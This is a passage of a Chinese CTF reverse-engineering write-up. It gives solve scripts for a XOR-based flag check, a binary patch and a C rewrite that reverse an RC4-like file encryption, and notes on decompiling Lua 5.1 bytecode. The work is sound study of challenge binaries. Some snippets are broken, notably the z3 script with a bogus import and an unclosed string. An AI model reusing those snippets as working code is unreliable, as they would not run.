class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>摘录关键逻辑</p><p>逆向解的话有两个思路，⼀是通过倒序解 Str[i] ，但 Str[i] 取了模存在信息丢失，很难解）需要爆破；⼆是通过正序解 Str[i+1] ，这个需要知道 Str[0] 就能递推。经过 ⼿动解前⼏个得出开头为 flag{ ，因此 Str[0] 就是 f</p><p>思路一的exp;</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">target <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0x7D</span> <span class="token punctuation">]</span>aImouto <span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token builtin">len</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>flag<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> target<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">checkflag</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>idx<span class="token operator">==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag：爆破成功!"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>        result    <span class="token keyword">for</span> ch1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> target<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">(</span>aImouto<span class="token punctuation">[</span>idx<span class="token operator">%</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span>idx<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>ch1<span class="token operator">%</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            result<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token operator">=</span>ch1            checkflag<span class="token punctuation">(</span>idx<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>result<span class="token punctuation">)</span>            checkflag<span class="token punctuation">(</span>idx<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>result<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ch1<span class="token operator">==</span><span class="token number">128</span> <span class="token keyword">and</span> result<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>checkflag<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>思路二的exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">]</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token comment"># """ 正向逻辑：</span><span class="token comment"># for i in range(len(input)-1)</span><span class="token comment"># enc[i]=Imouto[i%6]^(input[i+1]+input[i]%20)</span><span class="token comment"># enc[len(input)-1]=input[len(input)-1]</span><span class="token comment"># chr(0x7D)='&#125;'</span><span class="token comment"># 那么我们就可以逆向求解</span><span class="token comment"># from string import printable</span><span class="token comment"># input 都是可读字符</span>key<span class="token operator">=</span><span class="token string">'IMouto'</span>flag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'f'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token comment"># flag[i+1]=((enc[i]-flag[i]%20)^ord(key[i%6]))&amp;0xff</span><span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span> <span class="token punctuation">)</span><span class="token comment">#减法优先级高于异或</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>z3的解法</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"> <span class="token keyword">from</span> prism <span class="token keyword">import</span> <span class="token operator">*</span> key <span class="token operator">=</span> 'IMouto last <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">]</span>out<span class="token punctuation">,</span>flag <span class="token operator">=</span> zini<span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span>f <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">:</span>f<span class="token punctuation">.</span>add<span class="token punctuation">(</span>last<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span>out<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>out<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>isflag<span class="token punctuation">(</span>f<span class="token punctuation">,</span>flag<span class="token punctuation">)</span>zcheck<span class="token punctuation">(</span>f<span class="token punctuation">,</span>flag<span class="token punctuation">)</span> <span class="token comment"># flag&#123;!_r3ea11y_w4nt_@_cu7e_s1$ter&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="findme"><a class="markdownIt-Anchor" href="#findme"></a> findme</h3><p><code>die</code>查看一下三个文件的信息，发现文件4可以打开</p><p>221525</p><p>可以分析出:首先进行<code>rc4_init</code>初始化一个512数组</p><p>然后打开<code>Doraemon3</code>文件读取文件流，然后逐字符进行rc4加密，并且以<code>sbox[idx%512]</code>作为伪随机数种子获得随机数，写入随机大小的垃圾数组得到<code>filestream1</code>。而题目只给了我们1,2没有给3，我们要先由文件1逆推得到3</p><ul><li>思路1:看了师傅们的wp，由于rc4是流加密，s[box]加密解密不变，因此加密和解密的伪随机数生成的也是一一样的，rc4解密好处理，关键是垃圾数据的去除。事实上只要把fputc给hook成fgetc就完美还原了文件解密的过程</li></ul><p>​如何patch?</p><p>​</p><p>patch fputc的字节码为：FF 15 0B B0 00 00，</p><p>由于fgetc只需要1个参数且第一个参数存入rcx</p><p>fputc函数的调用第一个参数存入rcx，第二个参数存入的是rdx</p><p>patch后需要把rdx改为rcx然后nop掉中间将第一个参数传入rcx的指令就可以把第二个参数传入rcx当中并且正常运行了</p><p>因此要修改这四处地方，更换输入输出</p><p>222300</p><ul><li><p>思路2：照着加密逻辑，写正向脚本，按照第一种思路把输入输出流给颠倒一下获得解密脚本,函数主体直接copy反编译的源码，然后稍微修改一下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>Str <span class="token operator">=</span> <span class="token string">"Find_Doraemon"</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> BOX<span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">init_box</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>v0<span class="token punctuation">;</span>        <span class="token comment">// rdi</span>    __int64 i<span class="token punctuation">;</span>       <span class="token comment">// rcx</span>    <span class="token keyword">char</span> v3<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token comment">// [rsp+0h] [rbp-20h] BYREF</span>    <span class="token keyword">char</span> v4<span class="token punctuation">;</span>         <span class="token comment">// [rsp+20h] [rbp+0h] BYREF</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp+4h]</span>    <span class="token keyword">char</span> v6<span class="token punctuation">;</span>         <span class="token comment">// [rsp+44h] [rbp+24h]</span>    <span class="token keyword">char</span> v7<span class="token punctuation">[</span><span class="token number">532</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// [rsp+70h] [rbp+50h] BYREF</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span>  <span class="token comment">// [rsp+284h] [rbp+264h]</span>    <span class="token keyword">int</span> v9<span class="token punctuation">;</span>          <span class="token comment">// [rsp+2A4h] [rbp+284h]</span>    <span class="token keyword">int</span> v10<span class="token punctuation">;</span>         <span class="token comment">// [rsp+2C4h] [rbp+2A4h]</span>    v5 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">0x200</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        v6 <span class="token operator">=</span> j<span class="token punctuation">;</span>        BOX<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>j<span class="token punctuation">;</span>        v7<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> Str<span class="token punctuation">[</span>j <span class="token operator">%</span> v5<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>v9 <span class="token operator">&lt;</span> <span class="token number">512</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        v10 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v7<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">+</span> BOX<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">+</span> v10<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">512</span><span class="token punctuation">;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">char</span> tmp <span class="token operator">=</span> BOX<span class="token punctuation">[</span>v9<span class="token punctuation">]</span><span class="token punctuation">;</span>        BOX<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">=</span> BOX<span class="token punctuation">[</span>v10<span class="token punctuation">]</span><span class="token punctuation">;</span>        BOX<span class="token punctuation">[</span>v10<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>        <span class="token operator">++</span>v9<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> v3<span class="token punctuation">;</span>           <span class="token comment">// rax</span>    <span class="token keyword">int</span> v5<span class="token punctuation">;</span>              <span class="token comment">// eax</span>    FILE <span class="token operator">*</span>fout<span class="token punctuation">;</span>        <span class="token comment">// [rsp+28h] [rbp+8h]</span>    FILE <span class="token operator">*</span>fin<span class="token punctuation">;</span>            <span class="token comment">// [rsp+48h] [rbp+28h]</span>    <span class="token keyword">int</span> v8<span class="token punctuation">;</span>              <span class="token comment">// [rsp+64h] [rbp+44h]</span>    <span class="token keyword">int</span> v9<span class="token punctuation">;</span>              <span class="token comment">// [rsp+84h] [rbp+64h]</span>    <span class="token keyword">int</span> v10<span class="token punctuation">;</span>             <span class="token comment">// [rsp+A4h] [rbp+84h]</span>    <span class="token keyword">int</span> v11<span class="token punctuation">;</span>             <span class="token comment">// [rsp+C4h] [rbp+A4h]</span>    <span class="token keyword">unsigned</span> __int8 v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+104h] [rbp+E4h]</span>    <span class="token keyword">unsigned</span> __int8 v13<span class="token punctuation">;</span> <span class="token comment">// [rsp+144h] [rbp+124h]</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>               <span class="token comment">// [rsp+164h] [rbp+144h]</span>    <span class="token function">init_box</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    v11 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    fout <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"Doraemon3"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    fin <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"Doraemon1"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span>fin<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        v10 <span class="token operator">=</span> <span class="token punctuation">(</span>v10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">512</span><span class="token punctuation">;</span>        v11 <span class="token operator">=</span> <span class="token punctuation">(</span>BOX<span class="token punctuation">[</span>v10<span class="token punctuation">]</span> <span class="token operator">+</span> v11<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">512</span><span class="token punctuation">;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">char</span> tmp <span class="token operator">=</span> BOX<span class="token punctuation">[</span>v10<span class="token punctuation">]</span><span class="token punctuation">;</span>        BOX<span class="token punctuation">[</span>v10<span class="token punctuation">]</span> <span class="token operator">=</span> BOX<span class="token punctuation">[</span>v11<span class="token punctuation">]</span><span class="token punctuation">;</span>        BOX<span class="token punctuation">[</span>v11<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>        v13 <span class="token operator">=</span> BOX<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>BOX<span class="token punctuation">[</span>v11<span class="token punctuation">]</span> <span class="token operator">+</span> BOX<span class="token punctuation">[</span>v10<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        v12 <span class="token operator">=</span> v13 <span class="token operator">^</span> <span class="token function">fgetc</span><span class="token punctuation">(</span>fin<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fputc</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> fout<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">srand</span><span class="token punctuation">(</span>BOX<span class="token punctuation">[</span>v8 <span class="token operator">%</span> <span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v9 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v9<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            v5 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">fgetc</span><span class="token punctuation">(</span>fin<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token operator">++</span>v8<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fout<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>最后获得3是个解密程序，用于解密2直接执行即可</p><p>238635</p><p>用010editor打开发现GIF89a是gif头,修改拓展名然后打开即可</p><p>238754</p><h3 id="今夕是何年"><a class="markdownIt-Anchor" href="#今夕是何年"></a> 今夕是何年</h3><p>与TCPL类似，用qemu搭建龙芯环境即可</p><p><a href="https://blog.csdn.net/longji/article/details/132724349">win11 使用 QEMU 配置龙芯 3A5000 虚拟环境_qemu 龙芯-CSDN博客</a></p><p><s>熟悉qemu的用法吧</s></p><h3 id="whats-this"><a class="markdownIt-Anchor" href="#whats-this"></a> What’s this</h3><p>拖进die，发现是lua编译</p><p><a href="https://luadec.metaworm.site/">Lua Decompiler (metaworm.site)</a></p><p><a href="https://www.luatool.cn/index.php">Lua 工具箱 (luatool.cn)</a></p><p>找个在线网站反编译一下</p><p>或者找在线工具</p><p><a href="https://github.com/viruscamp/luadec">viruscamp/luadec: Lua Decompiler for lua 5.1 , 5.2 and 5.3 (github.com)</a></p><p>239279</p><p>魔术数字51可判断版本为lua5.1</p><p>反编译的lua脚本经过混淆了，</p><p>抓取关键逻辑</p><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">Xor <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>num1<span class="token punctuation">,</span> num2<span class="token punctuation">)</span>  <span class="token comment">-- function num : 0_109</span>  <span class="token keyword">local</span> tmp1 <span class="token operator">=</span> num1  <span class="token keyword">local</span> tmp2 <span class="token operator">=</span> num2  <span class="token keyword">local</span> str <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">repeat</span>    <span class="token keyword">repeat</span>      <span class="token keyword">local</span> s1 <span class="token operator">=</span> tmp1 <span class="token operator">%</span> <span class="token number">2</span>      <span class="token keyword">local</span> s2 <span class="token operator">=</span> tmp2 <span class="token operator">%</span> <span class="token number">2</span>      <span class="token keyword">if</span> s1 <span class="token operator">==</span> s2 <span class="token keyword">then</span>        str <span class="token operator">=</span> <span class="token string">"0"</span> <span class="token operator">..</span> str      <span class="token keyword">else</span>        str <span class="token operator">=</span> <span class="token string">"1"</span> <span class="token operator">..</span> str      <span class="token keyword">end</span>      tmp1 <span class="token operator">=</span> <span class="token punctuation">(</span>math<span class="token punctuation">.</span>modf<span class="token punctuation">)</span><span class="token punctuation">(</span>tmp1 <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>      tmp2 <span class="token operator">=</span> <span class="token punctuation">(</span>math<span class="token punctuation">.</span>modf<span class="token punctuation">)</span><span class="token punctuation">(</span>tmp2 <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">until</span> tmp1 <span class="token operator">==</span> <span class="token number">0</span>  <span class="token keyword">until</span> tmp2 <span class="token operator">==</span> <span class="token number">0</span>  <span class="token keyword">return</span> <span class="token function">tonumber</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">end</span>value <span class="token operator">=</span> <span class="token string">""</span>output <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">while</span> <span class="token number">1</span> <span class="token keyword">do</span>  <span class="token keyword">local</span> temp <span class="token 